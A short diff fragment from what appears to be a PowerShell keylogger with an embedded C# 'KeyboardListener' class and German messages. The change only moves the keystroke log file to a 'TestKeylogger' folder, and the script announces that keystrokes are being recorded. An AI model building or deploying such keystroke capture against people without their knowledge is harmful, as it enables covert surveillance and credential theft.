@@ -21,7 +21,7 @@ public class KeyboardListener {
 "@
 
 # Hauptlogik
-$logFile = "C:\Users\Hacker\Desktop\Scripts\tastatureingaben.txt"
+$logFile = "C:\Users\Hacker\Desktop\TestKeylogger\tastatureingaben.txt"
 Write-Host "Tastatureingaben werden aufgezeichnet. Drücken Sie STRG+C, um zu beenden."
 
 while ($true) {
